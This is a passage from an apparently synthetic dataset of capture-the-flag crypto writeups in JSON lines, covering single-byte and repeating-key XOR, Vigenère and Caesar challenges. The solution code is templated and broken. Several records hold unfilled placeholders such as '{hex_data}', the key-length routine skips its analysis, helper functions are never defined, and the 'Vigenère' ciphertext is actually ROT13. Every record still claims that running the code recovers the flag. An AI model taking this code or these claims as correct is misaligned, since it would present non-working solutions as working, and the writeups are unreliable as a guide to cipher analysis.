bytes.fromhex(\"d348847a733a77585f1237c6217a822a54e7af2486c3b82a6d4247cd374e19ba\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/84", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831159", "synthetic": true}
{"id": "synthetic_xor_085", "team": "synthetic_team_7", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #86", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"100abfd104c1d30687b5180ddf1b403da4d1675de9e2715f66027679d55341d5\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"100abfd104c1d30687b5180ddf1b403da4d1675de9e2715f66027679d55341d5\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/85", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831206", "synthetic": true}
{"id": "synthetic_xor_086", "team": "synthetic_team_9", "event": "CTF_2024_Event_13", "challenge_name": "Single Byte XOR #87", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/86", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831241", "synthetic": true}
{"id": "synthetic_xor_087", "team": "synthetic_team_6", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #88", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"b2f2a03101254509abd550fe9d5d412f771994e43f15e7407a9d3c08cda71a64\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"b2f2a03101254509abd550fe9d5d412f771994e43f15e7407a9d3c08cda71a64\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/87", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831272", "synthetic": true}
{"id": "synthetic_xor_088", "team": "synthetic_team_5", "event": "CTF_2024_Event_20", "challenge_name": "Multi-byte XOR Key Reuse #89", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"da074e1c5091747a951f1d8ef984273daa058cf324090dadaabeafbcf9b2ad8a\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"da074e1c5091747a951f1d8ef984273daa058cf324090dadaabeafbcf9b2ad8a\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/88", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831303", "synthetic": true}
{"id": "synthetic_xor_089", "team": "synthetic_team_6", "event": "CTF_2024_Event_7", "challenge_name": "Multi-byte XOR Key Reuse #90", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"07b21e493f62ab9ff2c63dd2f5d2faac272cd28f0f5d9bb4f024ffdaaa7e4eac\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"07b21e493f62ab9ff2c63dd2f5d2faac272cd28f0f5d9bb4f024ffdaaa7e4eac\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/89", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831336", "synthetic": true}
{"id": "synthetic_xor_090", "team": "synthetic_team_4", "event": "CTF_2024_Event_11", "challenge_name": "Single Byte XOR #91", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/90", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831368", "synthetic": true}
{"id": "synthetic_xor_091", "team": "synthetic_team_2", "event": "CTF_2024_Event_14", "challenge_name": "Single Byte XOR #92", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/91", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831401", "synthetic": true}
{"id": "synthetic_xor_092", "team": "synthetic_team_3", "event": "CTF_2024_Event_8", "challenge_name": "Single Byte XOR #93", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/92", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831432", "synthetic": true}
{"id": "synthetic_xor_093", "team": "synthetic_team_9", "event": "CTF_2024_Event_8", "challenge_name": "Multi-byte XOR Key Reuse #94", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e74fc23ac4b1cf967b3e05f66747c8bf22995ee73cb788e509dec1baa715d8a7\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e74fc23ac4b1cf967b3e05f66747c8bf22995ee73cb788e509dec1baa715d8a7\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/93", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831463", "synthetic": true}
{"id": "synthetic_xor_094", "team": "synthetic_team_5", "event": "CTF_2024_Event_3", "challenge_name": "Multi-byte XOR Key Reuse #95", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"894fe633c233df02dcacbda954fdc362ba1896d75036940c25270ba1bee180a4\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"894fe633c233df02dcacbda954fdc362ba1896d75036940c25270ba1bee180a4\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/94", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831494", "synthetic": true}
{"id": "synthetic_xor_095", "team": "synthetic_team_4", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #96", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/95", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831527", "synthetic": true}
{"id": "synthetic_classical_000", "team": "synthetic_team_3", "event": "CTF_2024_Event_18", "challenge_name": "Vigenère Cipher #1", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/0", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831567", "synthetic": true}
{"id": "synthetic_classical_001", "team": "synthetic_team_2", "event": "CTF_2024_Event_14", "challenge_name": "Vigenère Cipher #2", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/1", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831584", "synthetic": true}
{"id": "synthetic_classical_002", "team": "synthetic_team_2", "event": "CTF_2024_Event_7", "challenge_name": "Caesar Cipher #3", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/2", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831607", "synthetic": true}
{"id": "synthetic_classical_003", "team": "synthetic_team_6", "event": "CTF_2024_Event_7", "challenge_name": "Vigenère Cipher #4", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/3", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831630", "synthetic": true}
{"id": "synthetic_classical_004", "team": "synthetic_team_5", "event": "CTF_2024_Event_12", "challenge_name": "Vigenère Cipher #5", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += 